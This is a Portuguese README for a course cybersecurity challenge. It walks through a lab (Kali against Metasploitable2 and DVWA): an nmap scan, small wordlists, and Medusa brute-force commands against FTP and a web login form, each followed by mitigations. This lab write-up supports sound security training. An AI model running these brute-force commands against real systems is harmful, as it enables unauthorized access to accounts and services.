# desafio1_dio_cyberseguranca

## Ambiente

Kali + Metasploitable2
![alt text](brute_force/image.png)

## Força bruta em FTP

### metasploitable2

```bash
ifconfig
```

![alt text](brute_force/image-1.png)

### kali

Ping

```bash
ping -c 3 192.168.56.101
```

![alt text](brute_force/image-2.png)

NMAP

```bash
nmap -sV -p 21,22,80,445,139 192.168.56.101
```

![alt text](brute_force/image-3.png)

FTP

```bash
ftp 192.168.56.101
```

![alt text](brute_force/image-4.png)

Criando lista de users

```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
```

```
user
msfadmin
admin
root
```

Criando lista de senhas

```bash
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

```
123456
password
qwerty
msfadmin
```

Força bruta com medusa e listas:

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
```

![alt text](brute_force/image-5.png)

Acessando ftp:

![alt text](brute_force/image-6.png)

### Mitigações

- Desativar serviços não utilizados
- Usar protocolos mais fortes / atualizados
- Senhas fortes

## Automação de tentativas em formulário web (DVWA)

![alt text](dvwa/image.png)

Request de login:
![alt text](dvwa/image-1.png)

Criando lista de users

```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
```

```
user
msfadmin
admin
root
```

Criando lista de senhas

```bash
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

```
123456
password
qwerty
msfadmin
```

ataque ao formulario:

```bash
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```

![alt text](dvwa/image-2.png)
![alt text](dvwa/image-3.png)

Usuario e senhas utilizados:
admin
password
![alt text](dvwa/image-4.png)

### Mitigações

- Politicas de limites de tentativas por IP
- Bloqueio depois de varias tentativas ao mesmo usuario
- Captcha
- MMA
- Senhas fortes
